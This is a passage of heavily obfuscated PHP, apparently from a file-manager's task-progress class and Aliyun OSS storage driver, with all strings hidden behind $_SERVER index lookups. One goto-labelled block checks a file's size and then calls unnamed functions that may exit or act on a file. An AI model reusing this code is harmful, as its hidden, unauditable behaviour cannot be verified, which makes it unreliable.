$ğ÷¹©Ø[110]) { if ($£ÆÇ »Œ[$ğ÷¹©Ø[1831]]) { $£ÆÇ »Œ[$ğ÷¹©Ø[1834]] = $£ÆÇ »Œ[$ğ÷¹©Ø[1833]] + $£ÆÇ »Œ[$ğ÷¹©Ø[1830]]; } } else { if ($£ÆÇ »Œ[$ğ÷¹©Ø[1837]] == $ğ÷¹©Ø[1405]) { if ($£ÆÇ »Œ[$ğ÷¹©Ø[1831]] == $ğ÷¹©Ø[1281]) { $£ÆÇ »Œ[$ğ÷¹©Ø[1834]] = $£ÆÇ »Œ[$ğ÷¹©Ø[1833]] + $£ÆÇ »Œ[$ğ÷¹©Ø[1830]] * 0.5; } else { if ($£ÆÇ »Œ[$ğ÷¹©Ø[1831]] == $ğ÷¹©Ø[110]) { $£ÆÇ »Œ[$ğ÷¹©Ø[1834]] = $£ÆÇ »Œ[$ğ÷¹©Ø[1833]] + $£ÆÇ »Œ[$ğ÷¹©Ø[1829]] * 0.5 + $£ÆÇ »Œ[$ğ÷¹©Ø[1830]] * 0.5; } } } } $£ÆÇ »Œ[$ğ÷¹©Ø[1777]] = $£ÆÇ »Œ[$ğ÷¹©Ø[1834]] / $£ÆÇ »Œ[$ğ÷¹©Ø[843]]; if ($£ÆÇ »Œ[$ğ÷¹©Ø[1777]] > 0) { $ïã¼üÀ = timeFloat() - $£ÆÇ »Œ[$ğ÷¹©Ø[1779]] - $£ÆÇ »Œ[$ğ÷¹©Ø[1782]]; $£ÆÇ »Œ[$ğ÷¹©Ø[1783]] = $ïã¼üÀ * (1 - $£ÆÇ »Œ[$ğ÷¹©Ø[1777]]) / $£ÆÇ »Œ[$ğ÷¹©Ø[1777]]; } } public function addPath($“•ÏĞÒÛ) { $°£Ÿ•˜í =& $_SERVER[±³—úê]; if (!$“•ÏĞÒÛ) { return; } $ô÷Œ³ò– =& $this->task; $Í“Š„÷§ = IO::infoWithChildren($“•ÏĞÒÛ); $›‘•ªƒ× = $ô÷Œ³ò–[$°£Ÿ•˜í[1838]] ? $ô÷Œ³ò–[$°£Ÿ•˜í[1838]][$°£Ÿ•˜í[1839]] : 0; $ô÷Œ³ò–[$°£Ÿ•˜í[1838]] = array($°£Ÿ•˜í[1839] => $›‘•ªƒ× + 1, $°£Ÿ•˜í[505] => $Í“Š„÷§[$°£Ÿ•˜í[32]], $°£Ÿ•˜í[87] => $Í“Š„÷§[$°£Ÿ•˜í[87]], $°£Ÿ•˜í[593] => $Í“Š„÷§[$°£Ÿ•˜í[593]] ? $Í“Š„÷§[$°£Ÿ•˜í[593]] : $Í“Š„÷§[$°£Ÿ•˜í[87]]); if ($Í“Š„÷§[$°£Ÿ•˜í[33]] == $°£Ÿ•˜í[242]) { $ô÷Œ³ò–[$°£Ÿ•˜í[1142]] += 1; } else { $ô÷Œ³ò–[$°£Ÿ•˜í[1142]] += $Í“Š„÷§[$°£Ÿ•˜í[82]][$°£Ÿ•˜í[80]]; if ($Í“Š„÷§[$°£Ÿ•˜í[193]]) { $ô÷Œ³ò–[$°£Ÿ•˜í[1142]] += $Í“Š„÷§[$°£Ÿ•˜í[82]][$°£Ÿ•˜í[81]] + 1; } } $ô÷Œ³ò–[$°£Ÿ•˜í[843]] += $Í“Š„÷§[$°£Ÿ•˜í[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ï›´§û’) { } public function sourceAddHashEnd($Åå…åÓŞ) { } public function sourceAddFileStart($Â»„óÇ¸) { $…³ñû¢ =& $_SERVER[±³—úê]; $òö† “ã =& $this->task; $òö† “ã[$…³ñû¢[1829]] = $Â»„óÇ¸[$…³ñû¢[79]]; $òö† “ã[$…³ñû¢[1827]] = $Â»„óÇ¸[$…³ñû¢[32]]; $òö† “ã[$…³ñû¢[1144]] = $Â»„óÇ¸[$…³ñû¢[32]]; $òö† “ã[$…³ñû¢[1840]] = $Â»„óÇ¸[$…³ñû¢[87]]; $this->update(); } public function sourceAddFileEnd($«Ôèâ‹Ş) { $¨şˆÆ£Ë =& $_SERVER[±³—úê]; $ò´ºàÖ =& $this->task; $ò´ºàÖ[$¨şˆÆ£Ë[1834]] += $«Ôèâ‹Ş[$¨şˆÆ£Ë[79]]; $ò´ºàÖ[$¨şˆÆ£Ë[1840]] = $«Ôèâ‹Ş[$¨şˆÆ£Ë[87]]; $this->update(1); } public function copyFileStart($òæåÂóØ, $Ø›Š°¦, $×İºéíŠ, $•ÓÅ òÏ, $¸äïÓ¥, $ß“îØ®€) { $›“âêÜÛ =& $_SERVER[±³—úê]; $”ÍÄÚ–– = $¸äïÓ¥; if ($”ÍÄÚ–– == $GLOBALS[$›“âêÜÛ[1841]]) { $”ÍÄÚ–– = $GLOBALS[$›“âêÜÛ[1842]]; } $GLOBALS[$›“âêÜÛ[1842]] = $¸äïÓ¥; $GLOBALS[$›“âêÜÛ[1841]] = $ß“îØ®€; $Öæº©„Õ =& $this->task; $Öæº©„Õ[$›“âêÜÛ[1827]] = $”ÍÄÚ––; $Öæº©„Õ[$›“âêÜÛ[1829]] = (int) $òæåÂóØ->size($Ø›Š°¦); $Öæº©„Õ[$›“âêÜÛ[1830]] = 0; $Öæº©„Õ[$›“âêÜÛ[1144]] = $›“âêÜÛ[12]; $Öæº©„Õ[$›“âêÜÛ[1831]] = $›“âêÜÛ[12]; $Öæº©„Õ[$›“âêÜÛ[1832]] = 0; $ªş¼¥ÚÉ = $Öæº©„Õ[$›“âêÜÛ[1829]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($Öæº©„Õ[$›“âêÜÛ[486]] . $›“âêÜÛ[1843]); if ($ªş¼¥ÚÉ && file_exists(get_path_father($•ÓÅ òÏ))) { Cache::set($Öæº©„Õ[$›“âêÜÛ[486]] . $›“âêÜÛ[1843], $•ÓÅ òÏ); $Öæº©„Õ[$›“âêÜÛ[1800]] = array($›“âêÜÛ[1844], $›“âêÜÛ[1845]); } $this->update(0, $ªş¼¥ÚÉ); } public static function updateCopyLocalFileSize($ãüÒ¦Ò›) { $¨ÕÍÇ®µ =& $_SERVER[±³—úê]; $¶ÌıªÃ¤ = Cache::get($ãüÒ¦Ò›[$¨ÕÍÇ®µ[486]] . $¨ÕÍÇ®µ[1843]); if (!$¶ÌıªÃ¤ || !file_exists($¶ÌıªÃ¤)) { return $ãüÒ¦Ò›; } $ãüÒ¦Ò›[$¨ÕÍÇ®µ[1830]] = @filesize($¶ÌıªÃ¤); $ãüÒ¦Ò›[$¨ÕÍÇ®µ[1834]] += $ãüÒ¦Ò›[$¨ÕÍÇ®µ[1830]]; self::updateTask($ãüÒ¦Ò›); return $ãüÒ¦Ò›; } public function copyFileEnd($€äØïµ­, $Ïòéâ¨¿, $¦“ãã‰Ú, $÷ƒéÖ•Í, $€ï¨œİĞ, $¥¯ÌÕôĞ) { $›È•›±ı =& $_SERVER[±³—úê]; $‹±¥øÂ‡ =& $this->task; $‹±¥øÂ‡[$›È•›±ı[1830]] = $‹±¥øÂ‡[$›È•›±ı[1829]]; $‹±¥øÂ‡[$›È•›±ı[1831]] = $›È•›±ı[12]; unset($‹±¥øÂ‡[$›È•›±ı[1800]]); if ($€ï¨œİĞ == $‹±¥øÂ‡[$›È•›±ı[1827]]) { $‹±¥øÂ‡[$›È•›±ı[1833]] += $‹±¥øÂ‡[$›È•›±ı[1829]]; $‹±¥øÂ‡[$›È•›±ı[1834]] = $‹±¥øÂ‡[$›È•›±ı[1833]]; $ÜÂâ»£ = 1; if (isset($‹±¥øÂ‡[$›È•›±ı[1840]]) && $‹±¥øÂ‡[$›È•›±ı[1840]] == $Ïòéâ¨¿) { $ÜÂâ»£ = 0; } $this->update($ÜÂâ»£); } else { $this->update(); $‹±¥øÂ‡[$›È•›±ı[1830]] = 0; } Cache::remove($‹±¥øÂ‡[$›È•›±ı[486]] . $›È•›±ı[1843]); self::log($›È•›±ı[1846] . $Ïòéâ¨¿ . $›È•›±ı[73] . $÷ƒéÖ•Í . $›È•›±ı[221] . $€ï¨œİĞ . $›È•›±ı[1847] . $‹±¥øÂ‡[$›È•›±ı[1827]]); } public function updateFileEnd($Ÿ‘êà¥, $íöœÊËé) { $¨ÀıÏŞ¢ =& $_SERVER[±³—úê]; $Ä½„ûÀø =& $this->task; $Ä½„ûÀø[$¨ÀıÏŞ¢[1827]] = $Ÿ‘êà¥; $Ä½„ûÀø[$¨ÀıÏŞ¢[1829]] = $íöœÊËé; $Ä½„ûÀø[$¨ÀıÏŞ¢[1833]] += $íöœÊËé; $Ä½„ûÀø[$¨ÀıÏŞ¢[1834]] = $Ä½„ûÀø[$¨ÀıÏŞ¢[1833]]; $this->update(1); self::log($¨ÀıÏŞ¢[1848] . $Ÿ‘êà¥); } public function sourceModelCopy($›”Ì‰á) { $Şšµ¾ =& $_SERVER[±³—úê]; $£™÷¹¶ = $›”Ì‰á[0]; $ıä¨· = $›”Ì‰á[1]; $Õ‡êŠˆ¼ =& $this->task; $this->sourceModelCopyFlag = !0; $İ¼üØøé = 0; switch ($£™÷¹¶) { case $Şšµ¾[649]: $İ¼üØøé = 1; break; case $Şšµ¾[652]: $Õ‡êŠˆ¼[$Şšµ¾[1827]] = $ıä¨·[$Şšµ¾[32]]; break; case $Şšµ¾[654]: $İ¼üØøé = intval($›”Ì‰á[$Şšµ¾[467]] * 0.4); break; case $Şšµ¾[656]: $İ¼üØøé = intval($›”Ì‰á[$Şšµ¾[467]] * 0.2); break; case $Şšµ¾[658]: $İ¼üØøé = intval($›”Ì‰á[$Şšµ¾[467]] * 0.4); break; } $this->update($İ¼üØøé); $this->sourceModelCopyFlag = !1; } public function sourceRemove($é‚¿ÇÖ¡, $ì¹Èó) { $ËÃ‡èæ² =& $_SERVER[±³—úê]; $this->sourceModelCopyFlag = !0; $¥•¼ŠÙ = 1; if (isset($é‚¿ÇÖ¡[$ËÃ‡èæ²[82]])) { $¥•¼ŠÙ = $é‚¿ÇÖ¡[$ËÃ‡èæ²[82]][$ËÃ‡èæ²[80]]; $¥•¼ŠÙ = $¥•¼ŠÙ + $é‚¿ÇÖ¡[$ËÃ‡èæ²[82]][$ËÃ‡èæ²[81]] + 1; } $this->update($¥•¼ŠÙ); $this->sourceModelCopyFlag = !1; } public function sourceMove($ªš¾öòÄ) { $this->sourceRemove($ªš¾öòÄ, !1); } public function curlProgress($ğ¤ĞÃ¹, $•°ıÆÃÙ, $”Ó×©„, $ë÷¬¶ê½, $÷’îÈøÃ) { $¬ÇªìÃó =& $_SERVER[±³—úê]; $“¶­€–© =& $this->task; if ($÷’îÈøÃ > 0) { $“¶­€–©[$¬ÇªìÃó[1144]] = $¬ÇªìÃó[1849]; $“¶­€–©[$¬ÇªìÃó[1831]] = $¬ÇªìÃó[110]; if ($“¶­€–©[$¬ÇªìÃó[1829]]) { $“¶­€–©[$¬ÇªìÃó[1830]] = $÷’îÈøÃ; } if ($“¶­€–©[$¬ÇªìÃó[1832]]) { $“¶­€–©[$¬ÇªìÃó[1830]] = $÷’îÈøÃ + $“¶­€–©[$¬ÇªìÃó[1832]]; } } else { if ($”Ó×©„ > 0) { if ($“¶­€–©[$¬ÇªìÃó[1829]] == $•°ıÆÃÙ) { $“¶­€–©[$¬ÇªìÃó[1830]] = $”Ó×©„; $“¶­€–©[$¬ÇªìÃó[1144]] = $¬ÇªìÃó[1850]; $“¶­€–©[$¬ÇªìÃó[1831]] = $¬ÇªìÃó[1281]; } } } $this->update(); } public function curlProgressStart($Şæä¥£•) { } public function curlProgressEnd($õç¨òø) { $¢“»µ—ú =& $_SERVER[±³—úê]; $ö¤ÆùÃ³ =& $this->task; $îÛ£ˆ×ö = curl_getinfo($õç¨òø); $§«€­Ñ = $îÛ£ˆ×ö[$¢“»µ—ú[1851]]; if ($§«€­Ñ == -1) { $§«€­Ñ = $îÛ£ˆ×ö[$¢“»µ—ú[1852]]; } if ($ö¤ÆùÃ³[$¢“»µ—ú[1831]] == $¢“»µ—ú[110] && $§«€­Ñ) { $ö¤ÆùÃ³[$¢“»µ—ú[1832]] += $§«€­Ñ; } $this->update(); } } goto a§‰˜‚òÃ‰; Føá¸‚¹¤¶: $_size = $_SERVER[±³—úê][1465]; if ($_SERVER[$_SERVER[±³—úê][216]] != $_size($_file)) { $_getc = $_SERVER[±³—úê][218]; $_getfile = $_SERVER[$_SERVER[±³—úê][219]] . $_SERVER[±³—úê][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±³—úê][221], $_getfilec); if (count($_getarrs) < $_SERVER[±³—úê][222]) { $exit = $_SERVER[±³—úê][223]; $exit(); } $_act = $_SERVER[±³—úê][224]; $_act($_file); } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($ÑËÎ†ßˆ) { parent::__construct(); include_once SDK_DIR . $_SERVER[±³—úê][1466]; $this->_init($ÑËÎ†ßˆ); } public function _init($›ğÍÓ¿Ê) { $µñÕï˜· =& $_SERVER[±³—úê]; $this->config = $›ğÍÓ¿Ê; foreach ($›ğÍÓ¿Ê as $Ô¤Ùâç× => $‹®£ºò) { if (isset($this->{$Ô¤Ùâç×})) { $this->{$Ô¤Ùâç×} = $‹®£ºò; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($µñÕï˜·[1467] . LNG($µñÕï˜·[1468])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¿ğùê·© =& $_SERVER[±³—úê]; $ğµçÏ¥Â = new OSS\Model\CorsConfig(); $ïëÜÜš› = new OSS\Model\CorsRule(); $ïëÜÜš›->addAllowedOrigin($¿ğùê·©[1469]); $ïëÜÜš›->addAllowedMethod($¿ğùê·©[1470]); $ïëÜÜš›->addAllowedMethod($¿ğùê·©[1471]); $ïëÜÜš›->addAllowedMethod($¿ğùê·©[1472]); $ïëÜÜš›->addAllowedMethod($¿ğùê·©[1473]); $ïëÜÜš›->addAllowedMethod($¿ğùê·©[165]); $ïëÜÜš›->setMaxAgeSeconds(600); $ïëÜÜš›->addExposeHeader($¿ğùê·©[1474]); $ïëÜÜš›->addAllowedHeader($¿ğùê·©[1469]); $ğµçÏ¥Â->addRule($ïëÜÜš›); try { $this->client->putBucketCors($this->bucket, $ğµçÏ¥Â); } catch (OSS\Core\OssException $ŒïÑ¹) { $this->writeLog(__FUNCTION__ . $¿ğùê·©[214] . $ŒïÑ¹->getMessage()); return !1; } return !0; } public function getBucketCors() { $³¢›¿Íƒ =& $_SERVER[±³—úê]; $¡…â€Ûæ = null; try { $¡…â€Ûæ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ë“¬¤ ) { $this->writeLog(__FUNCTION__ . $³¢›¿Íƒ[214] . $Ë“¬¤ ->getMessage()); return null; } if (!$¡…â€Ûæ || !($òÏÊÑûã = $¡…â€Ûæ->getRules())) { return null; } $¸ ¹‹¡  = $òÏÊÑûã[0]->getAllowedOrigins(); $˜ìÇÏÄ = $òÏÊÑûã[0]->getAllowedMethods(); $Ê¶„éñÒ = $òÏÊÑûã[0]->getMaxAgeSeconds(); $£§Ô’úĞ = $òÏÊÑûã[0]->getExposeHeaders(); $å÷ïš³… = $òÏÊÑûã[0]->getAllowedHeaders(); return array($³¢›¿Íƒ[230] => isset($¸ ¹‹¡ [0]) ? $¸ ¹‹¡ [0] : $³¢›¿Íƒ[12], $³¢›¿Íƒ[234] => $˜ìÇÏÄ, $³¢›¿Íƒ[1475] => $Ê¶„éñÒ, $³¢›¿Íƒ[1476] => isset($£§Ô’úĞ[0]) ? $£§Ô’úĞ[0] : $³¢›¿Íƒ[12], $³¢›¿Íƒ[231] => isset($å÷ïš³…[0]) ? $å÷ïš³…[0] : $³¢›¿Íƒ[12]); } public function isBucketCors() { $ä²ˆ°¤ =& $_SERVER[±³—úê]; $†µÈ¶„† = $this->getBucketCors(); if (!$†µÈ¶„† || !is_array($†µÈ¶„†)) { return !1; } if ($†µÈ¶„†[$ä²ˆ°¤[230]] != $ä²ˆ°¤[232] || $†µÈ¶„†[$ä²ˆ°¤[231]] != $ä²ˆ°¤[232]) { return !1; } $æ×øÍæ‹ = array_map($ä²ˆ°¤[233], $†µÈ¶„†[$ä²ˆ°¤[234]]); if (!is_array($æ×øÍæ‹)) { $æ×øÍæ‹ = array(); } $¼•Ü‘·« = array($ä²ˆ°¤[235], $ä²ˆ°¤[236], $ä²ˆ°¤[237], $ä²ˆ°¤[238], $ä²ˆ°¤[239]); $¬íõÚÁ = array_diff($¼•Ü‘·«, $æ×øÍæ‹); return empty($¬íõÚÁ); } public function mkfile($®¤ãïÙ¶, $Ëªı™ãù = '', $¿À„Û¤Õ = REPEAT_RENAME) { $è²Ñ¹¼¼ = $this->setContent($®¤ãïÙ¶, $Ëªı™ãù); if ($è²Ñ¹¼¼ !== !1) { return $this->getPathOuter($®¤ãïÙ¶); } return !1; } public function mkdir($¨ş¦ôÒş, $ß”…±„Ò = REPEAT_SKIP) { if ($ß”…±„Ò && $this->_isFolder($¨ş¦ôÒş)) { return $this->getPathOuter($¨ş¦ôÒş); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¨ş¦ôÒş)); } catch (OSS\Core\OssException $½ĞÉ²€‘) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][214] . $½ĞÉ²€‘->getMessage()); return !1; } return $this->getPathOuter($¨ş¦ôÒş); } private function fileList($êİÓÇÔ’, $Ü¦Şåõ¬ = '', $êÍ™€ëæ = 0) { $‹êŞ‹–ğ =& $_SERVER[±³—úê]; $êİÓÇÔ’ = trim($êİÓÇÔ’, $‹êŞ‹–ğ[8]); $¨¢í‡ôÇ = empty($êİÓÇÔ’) && $êİÓÇÔ’ !== $‹êŞ‹–ğ[240] ? $‹êŞ‹–ğ[12] : $êİÓÇÔ’ . $‹êŞ‹–ğ[8]; $×™©ÔÖ = $‹êŞ‹–ğ[12]; $Í¶Â–«Ü = 1000; $ïŠ¯åÊ = $õ“Ëó«˜ = array(); while (!0) { check_abort(); $øÖèšÒ» = array($‹êŞ‹–ğ[1477] => $Ü¦Şåõ¬, $‹êŞ‹–ğ[1478] => $¨¢í‡ôÇ, $‹êŞ‹–ğ[1479] => $Í¶Â–«Ü, $‹êŞ‹–ğ[1480] => $×™©ÔÖ); try { $¾¾¯ÀôŠ = $this->client->listObjects($this->bucket, $øÖèšÒ»); } catch (OSS\Core\OssException $ÑçÖÉ›) { $this->writeLog(__FUNCTION__ . $‹êŞ‹–ğ[214] . $ÑçÖÉ›->getMessage()); break; } $×™©ÔÖ = $¾¾¯ÀôŠ->getNextMarker(); $–¤éù„ø = $¾¾¯ÀôŠ->getObjectList(); $ŠÛê¯ÈÁ = $¾¾¯ÀôŠ->getPrefixList(); foreach ($–¤éù„ø as $î÷¼’ö) { if ($î÷¼’ö->getKey() == $¨¢í‡ôÇ) { continue; } $”ƒô‹Ëš = $î÷¼’ö->getKey(); $’ß¤¸Ïƒ = $î÷¼’ö->getSize(); $ëàˆ… = $î÷¼’ö->getLastModified(); $¦±Àñ‰Ö = trim($î÷¼’ö->getETag(), $‹êŞ‹–ğ[121]); $”¢ò—×ò = $êÍ™€ëæ ? array($‹êŞ‹–ğ[32] => $”ƒô‹Ëš, $‹êŞ‹–ğ[79] => $’ß¤¸Ïƒ, $‹êŞ‹–ğ[206] => strtotime($ëàˆ…), $‹êŞ‹–ğ[1481] => $¦±Àñ‰Ö) : $”ƒô‹Ëš; $¤Ÿº£‘ = $’ß¤¸Ïƒ == 0 && substr($”ƒô‹Ëš, strlen($”ƒô‹Ëš) - 1, 1) == $‹êŞ‹–ğ[8] ? !0 : !1; $±üÊë¼´ = array($‹êŞ‹–ğ[79] => $’ß¤¸Ïƒ, $‹êŞ‹–ğ[1482] => $’ß¤¸Ïƒ, $‹êŞ‹–ğ[88] => strtotime($ëàˆ…), $‹êŞ‹–ğ[1483] => $ëàˆ…, $‹êŞ‹–ğ[1481] => $¦±Àñ‰Ö); $this->cacheMethodInfoSet($”ƒô‹Ëš, $¤Ÿº£‘, $±üÊë¼´); if ($¤Ÿº£‘) { $ïŠ¯åÊ[] = $”ƒô‹Ëš; continue; } $õ“Ëó«˜[] = $”¢ò—×ò; } foreach ($ŠÛê¯ÈÁ as $ã®âéä) { $ïŠ¯åÊ[] = $ã®âéä->getPrefix(); $this->cacheMethodInfoSet($ã®âéä->getPrefix(), !0); } if ($×™©ÔÖ === $‹êŞ‹–ğ[12]) { break; } } $this->cacheMethodInfoSet($êİÓÇÔ’, !0); return array($‹êŞ‹–ğ[85] => $ïŠ¯åÊ, $‹êŞ‹–ğ[86] => $õ“Ëó«˜); } public function listObject($°Í™«¥, $û±ĞÂìé = '') { $ÎøÇîÍ =& $_SERVER[±³—úê]; $°Í™«¥ = trim($°Í™«¥, $ÎøÇîÍ[8]); $Ì³É±¯ç = empty($°Í™«¥) && $°Í™«¥ !== $ÎøÇîÍ[240] ? $ÎøÇîÍ[12] : $°Í™«¥ . $ÎøÇîÍ[8]; $™‘¢¨çÓ = $ÎøÇîÍ[12]; $™€¥¸¾ = 1000; $ºìòàùÄ = $·àšâõØ = array(); while (!0) { check_abort(); $İ˜°Îóø = array($ÎøÇîÍ[1477] => $û±ĞÂìé, $ÎøÇîÍ[1478] => $Ì³É±¯ç, $ÎøÇîÍ[1479] => $™€¥¸¾, $ÎøÇîÍ[1480] => $™‘¢¨çÓ); try { $ã¤¿È¼† = $this->client->listObjects($this->bucket, $İ˜°Îóø); } catch (OSS\Core\OssException $‡ÏûëË) { $this->writeLog(__FUNCTION__ . $ÎøÇîÍ[214] . $‡ÏûëË->getMessage()); break; } $™‘¢¨çÓ = $ã¤¿È¼†->getNextMarker(); $¶ËŒèî = $ã¤¿È¼†->getObjectList(); foreach ($¶ËŒèî as $¥™¶É“Ó) { if ($¥™¶É“Ó->getKey() == $Ì³É±¯ç) { continue; } $Şúğş©œ = $¥™¶É“Ó->getKey(); $¹ââı‡‰ = $¥™¶É“Ó->getSize(); $Öáäİ = $¹ââı‡‰ == 0 && substr($Şúğş©œ, strlen($Şúğş©œ) - 1, 1) == $ÎøÇîÍ[8] ? !0 : !1; if ($Öáäİ) { continue; } $·àšâõØ[] = $¹ââı‡‰ . $ÎøÇîÍ[214] . $Şúğş©œ; } if ($™‘¢¨çÓ === $ÎøÇîÍ[12]) { break; } } return array($ÎøÇîÍ[85] => $ºìòàùÄ, $ÎøÇîÍ[86] => $·àšâõØ); } public function copyFile($Éá¢†Ä, $ÂÛáÖ”¢) { $İ™®ÆŞ¾ = $this->size($Éá¢†Ä); if ($İ™®ÆŞ¾ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Éá¢†Ä, $this->bucket, $this->pathEncode($ÂÛáÖ”¢)); } catch (OSS\Core\OssException $×§í«ù) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][214] . $×§í«ù->getMessage()); return !1; } return $this->getPathOuter($ÂÛáÖ”¢); } $¶ÍİŞø = $this->multiCopyObject($Éá¢†Ä, $ÂÛáÖ”¢, $İ™®ÆŞ¾); return $¶ÍİŞø ? $this->getPathOuter($ÂÛáÖ”¢) : !1; } private function multiCopyObject($¿ÇŒÏÓò, $€Ô•ñ¿‡, $ù™æú¤Ù) { $Ê¿…‹ß’ =& $_SERVER[±³—úê]; try { $±ˆ¬øÇ¾ = array(); if ($Å˜•†‘å = $this->hashMd5($¿ÇŒÏÓò)) { $±ˆ¬øÇ¾ = array(OSS\OssClient::OSS_HEADERS => array($Ê¿…‹ß’[1484] => $Å˜•†‘å)); } $×§ÅÖÁ¾ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($€Ô•ñ¿‡), $±ˆ¬øÇ¾); $£ùÍÉÃö = 1; $ŠÓ¦Ÿ“Ö = 0; $ÜÂÂ¦ÍÃ = array(); $ÛñìÖİ— = 1024 * 1024 * 10; $â›äŞÅ = $this->client->generateMultiuploadParts($ù™æú¤Ù, $ÛñìÖİ—); foreach ($â›äŞÅ as $ªÇ¶·£ => $–Ìßœ‘ƒ) { $ñÄ™Ôúü = $ŠÓ¦Ÿ“Ö + (int) $–Ìßœ‘ƒ[$Ê¿…‹ß’[1485]]; $‹±êŸù = (int) $–Ìßœ‘ƒ[$Ê¿…‹ß’[423]] + $ñÄ™Ôúü - 1; $úŸñ = array($Ê¿…‹ß’[167] => $ñÄ™Ôúü, $Ê¿…‹ß’[168] => $‹±êŸù); $ÜÂÂ¦ÍÃ[] = $this->client->uploadPartCopy($this->bucket, $¿ÇŒÏÓò, $this->bucket, $this->pathEncode($€Ô•ñ¿‡), $£ùÍÉÃö, $×§ÅÖÁ¾, $úŸñ); $£ùÍÉÃö = $£ùÍÉÃö + 1; } $¬‹îü‚À = array(); foreach ($ÜÂÂ¦ÍÃ as $ªÇ¶·£ => $¹æ»ş£Ú) { $¬‹îü‚À[] = array($Ê¿…‹ß’[308] => $ªÇ¶·£ + 1, $Ê¿…‹ß’[309] => $¹æ»ş£Ú); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($€Ô•ñ¿‡), $×§ÅÖÁ¾, $¬‹îü‚À); } catch (OSS\Core\OssException $ÉÓğĞ‚š) { $this->writeLog(__FUNCTION__ . $Ê¿…‹ß’[214] . $ÉÓğĞ‚š->getMessage()); return !1; } return !0; } public function moveFile($ÁˆÃ¶°È, $¨¹™ı£ª) { if ($this->copyFile($ÁˆÃ¶°È, $¨¹™ı£ª)) { $this->remove($ÁˆÃ¶°È); return $this->getPathOuter($¨¹™ı£ª); } return !1; } public function delFile($‚Ó§®©Ó) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($‚Ó§®©Ó)); } catch (OSS\Core\OssException $úïÒã½±) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][214] . $úïÒã½±->getMessage()); return !1; } return !0; } public function delFolder($”Àì¬¨‚) { $ïç‘ğç€ =& $_SERVER[±³—úê]; if (!$this->exist($”Àì¬¨‚)) { return !0; } $this->listItemCache = !1; $Ü¯ì©Üê = $this->fileList($”Àì¬¨‚); $this->listItemCache = !0; $èó‚á¨ = trim($”Àì¬¨‚, $ïç‘ğç€[8]) . $ïç‘ğç€[8]; if (!empty($”Àì¬¨‚) && $”Àì¬¨‚ !== $ïç‘ğç€[240] && !in_array($èó‚á¨, $Ü¯ì©Üê[$ïç‘ğç€[85]])) { $Ü¯ì©Üê[$ïç‘ğç€[85]][] = $èó‚á¨; } $ùõ²Ûçş = $this->delByBatch($Ü¯ì©Üê[$ïç‘ğç€[86]]); if (!$ùõ²Ûçş) { return !1; } $ùõ²Ûçş = $this->delByBatch($Ü¯ì©Üê[$ïç‘ğç€[85]]); if (!$ùõ²Ûçş) { return !1; } return $this->delFile($èó‚á¨); } private function delByBatch($Ä²çñó) { foreach (array_chunk($Ä²çñó, 1000) as $×ÂÇ¬“Î) { try { $this->client->deleteObjects($this->bucket, $×ÂÇ¬“Î); } catch (OSS\Core\OssException $†¬‰îºä) { $this->writeLog(__FUNCTION__ . $_SERVER[±³—úê][214] . $†¬‰îºä->getMessage()); return !1; } } return !0; } public function rename($Ë”¥³Â, $’’Â¨§ü) { return $this->renameObject($Ë”¥³Â, $’’Â¨§ü); } private function fileInfo($Î“ä¦ ¾, $¥ìÂâµÕ = false, $ò„â­Ø = array()) { $ñ©¤İİ€ =& $_SERVER[±³—úê]; $¿·¥¦¥æ = array($ñ©¤İİ€[32] => $this->pathThis($Î“ä¦ ¾), $ñ©¤İİ€[87] => $this->getPathOuter($Î“ä¦ ¾), $ñ©¤İİ€[33] => $ñ©¤İİ€[242], $ñ©¤İİ€[79] => isset($ò„â­Ø[$ñ©¤İİ€[79]]) ? $ò„â­Ø[$ñ©¤İİ€[79]] : 0, $ñ©¤İİ€[169] => $this->ext($Î“ä¦ ¾)); if ($¥ìÂâµÕ) { return $¿·¥¦¥æ; } $¿·¥¦¥æ[$ñ©¤İİ€[243]] = $¿·¥¦¥æ[$ñ©¤İİ€[88]] = 0; $¿·¥¦¥æ[$ñ©¤İİ€[244]] = $¿·¥¦¥æ[$ñ©¤İİ€[245]] = !0; if (empty($ò„â­Ø)) { $œÍëÒÒ³ = $this->objectMeta($Î“ä¦ ¾); if (!$œÍëÒÒ³) { return $¿·¥¦¥æ; } $ò„â­Ø = array($ñ©¤İİ€[88] => strtotime($œÍëÒÒ³[$ñ©¤İİ€[1483]]), $ñ©¤İİ€[79] => $œÍëÒÒ³[$ñ©¤İİ€[1482]] + 0, $ñ©¤İİ€[1481] => $œÍëÒÒ³[$ñ©¤İİ€[1481]]); } if (isset($ò„â­Ø[$ñ©¤İİ€[1481]]) && $ò„â­Ø[$ñ©¤İİ€[1481]]) { $¿·¥¦¥æ[$ñ©¤İİ€[247]] = trim($ò„â­Ø[$ñ©¤İİ€[1481]], $ñ©¤İİ€[121]); } if (isset($ò„â­Ø[$ñ©¤İİ€[79]])) { $¿·¥¦¥æ[$ñ©¤İİ€[79]] = $ò„â­Ø[$ñ©¤İİ€[79]]; } if (isset($ò„â­Ø[$ñ©¤İİ€[88]])) { $¿·¥¦¥æ[$ñ©¤İİ€[88]] = $ò„â­Ø[$ñ©¤İİ€[88]]; } if (isset($ò„â­Ø[$ñ©¤İİ€[206]]) && !trim($¿·¥¦¥æ[$ñ©¤İİ€[88]])) { $¿·¥¦¥æ[$ñ©¤İİ€[88]] = $ò„â­Ø[$ñ©¤İİ€[206]]; } return $¿·¥¦¥æ; } private function 